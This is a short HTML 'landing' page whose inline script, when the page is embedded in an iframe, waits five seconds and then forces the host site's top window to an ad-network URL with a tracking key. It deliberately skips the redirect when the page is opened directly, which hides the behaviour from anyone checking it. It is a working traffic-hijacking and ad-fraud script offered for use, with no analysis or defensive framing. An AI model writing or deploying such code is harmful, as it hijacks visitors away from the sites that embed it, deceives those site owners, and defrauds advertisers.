<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Landing</title>
</head>
<body>

<h1>landing-redirect</h1>

<script>
(function () {

  // Jangan redirect kalau dibuka langsung
  if (window.self === window.top) return;

  // Delay aman untuk iframe traffic
  setTimeout(function () {
    try {
      window.top.location.replace("https://www.effectivegatecpm.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717");
    } catch (e) {
      window.location.href = "https://www.effectivegatecpm.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717";
    }
  }, 5000);

})();
</script>

</body>
</html>
